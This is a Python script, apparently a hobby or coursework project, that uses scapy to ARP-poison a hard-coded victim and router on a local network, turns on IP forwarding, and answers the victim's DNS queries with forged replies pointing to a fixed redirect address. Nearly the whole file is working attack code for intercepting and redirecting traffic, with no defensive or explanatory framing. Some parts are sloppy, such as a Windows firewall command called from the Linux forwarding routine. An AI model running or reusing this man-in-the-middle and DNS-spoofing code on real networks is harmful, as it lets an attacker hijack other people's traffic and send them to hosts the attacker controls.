import scapy.all as scapy
from subprocess import Popen, PIPE
from multiprocessing import Process
import time
import ipaddress
import sys

def validate_ip_address(address):
    ip = 'inputted'
    try:
        ip = ipaddress.ip_address(address)
        return True
    except ValueError:
        print(f"IP address {ip} is not valid".format(address))

def MacAddress(ip):
	ipMac = scapy.getmacbyip(ip)
	return ipMac

# def _enable_windows_iproute():
#     """
#     Enables IP route (IP Forwarding) in Windows
#     """
#     from services import WService
#     # enable Remote Access service
#     service = WService("RemoteAccess")
#     service.start()

def forwarding():
	#write "1" into /proc/sys/net/ipv4/ip_forward
	ipforward = "echo \"1\" >> /proc/sys/net/ipv4/ip_forward"
	Popen([ipforward], shell=True, stdout=PIPE)

	#Firewall rule, disable forwarding of any UDP packets to dport 53
	# firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
	# firewall = "iptables -P FORWARD DROP"
	# firewall = "iptables -t filter -A FORWARD -p udp 53 -j DROP"
	firewall = "netsh advfirewall set rule \"Failover Clusters (UDP-IN)\" new enable=yes"
	Popen([firewall], shell=True, stdout=PIPE)

def spoof(target_ip, spoof_ip):
	target_mac = MacAddress(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	# print(packet.show)
	scapy.send(packet, verbose=False)

def arpPoison(victim, router):
	#IP and MAC addresses
	# victimIP = victim
	# routerIP = router
	victimIP = '192.168.1.77'
	routerIP = '192.168.1.254'
	print(f"Starting ARP poisoning to victim {victimIP} and router {routerIP}")
	sent_packets_count = 0
	while True:
		spoof(victimIP, routerIP)
		spoof(routerIP, victimIP)
		sent_packets_count += 2
		# print(f"\rPackets sent: {sent_packets_count}", end="")
		time.sleep(2)

def sniffDNS():
	victimIP = '192.168.1.77'
	scapy.sniff(filter=f"udp and port 53 and host {victimIP}", prn=spoofDNS)

def spoofDNS(packet):
	victimIP = '192.168.1.77'
	redirectIP = '199.59.243.220'
	# print(packet.show)
	if packet['IP'].src == victimIP:
	#Checks if it is a DNS packet
		if packet.haslayer(scapy.DNS):
			#Checks if the packet is a DNS query
			if scapy.DNSQR in packet:
				#Send back a spoofed packet
				spoofed_pkt = (scapy.Ether()/scapy.IP(dst=packet['IP'].src, src=packet['IP'].dst)/\
	                      scapy.UDP(dport=packet['UDP'].sport, sport=packet['UDP'].dport)/\
	                      scapy.DNS(id=packet['DNS'].id, qd=packet['DNS'].qd, aa = 1, qr=1, \
	                      an=scapy.DNSRR(rrname=packet['DNS'].qd.qname,  ttl=10, rdata=redirectIP)))
				scapy.sendp(spoofed_pkt, count=1)

if __name__ == '__main__':

	# victimIP = input("Victim IP address: ")
	victimIP = '192.168.1.77'
	if not validate_ip_address(victimIP):
		sys.exit()
	# routerIP = input("Router IP address: ")
	routerIP = '192.168.1.254'
	if not validate_ip_address(routerIP):
		sys.exit()
	# redirectIP = input("Redirect IP address: ")
	redirectIP = '199.59.243.220'
	if not validate_ip_address(redirectIP):
		sys.exit()


	#enable fowrwarding and the firewall
	forwarding()
	# _enable_windows_iproute()

	arpPoisonProcess = Process(target=arpPoison,args=(victimIP,routerIP))
	arpPoisonProcess.start()
	sniffDNSprocess = Process(target=sniffDNS)
	sniffDNSprocess.start()
	arpPoisonProcess.join()
	sniffDNSprocess.join()
